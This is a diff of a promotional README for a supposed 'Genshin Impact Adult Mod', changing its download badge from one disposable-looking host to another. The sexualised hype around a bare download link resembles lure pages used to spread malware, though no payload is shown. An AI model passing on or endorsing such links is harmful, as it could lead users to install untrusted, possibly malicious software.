@@ -2,7 +2,7 @@
 
 Genshin’s got the world, the waifus, and the drip — but what if you could take it all a step further? The **Genshin Impact Adult Mod** brings NSFW vibes to your favorite characters with **uncensored outfits, custom animations, physics tweaks**, and camera freedom that miHoYo would never officially allow. Whether you're crushing on Lisa, Shenhe, or Eula, this mod setup turns Teyvat into your personal playground. 💋⚡
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload16.bitbucket.io)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://Genshin-Impact-Adult-Mod-zy1.github.io/.github)
 ---
 
 ## 🧠 What Is the Genshin Impact Adult Mod?
